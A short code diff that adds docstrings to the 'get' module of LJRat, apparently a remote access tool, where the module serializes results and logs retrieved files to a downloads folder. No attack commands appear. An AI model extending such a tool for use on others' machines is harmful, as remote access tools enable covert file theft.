@@ -1,3 +1,7 @@
+"""
+Module that adds the get functionality to LJRat
+"""
+
 import struct
 import message
 import os
@@ -23,9 +27,11 @@ def entrypoint(self, args):
     return (msg, E_SUCCESS)
 
 def validator(args):
+    '''Function to validate arguments'''
     return
 
 def _serialize(data):
+    '''Function to take all the required arguments and pack a data structure with binary data'''
     serialized_data = bytearray()
 
     result_code = 0
@@ -45,6 +51,7 @@ def _serialize(data):
     return serialized_data
 
 def _deserialize(msg):
+    '''Function that calls the formatter and outputs the data to a log'''
     log_dir = ctx.log_dir + os.sep + "downloads"
 
     if msg.result_code == E_SUCCESS:
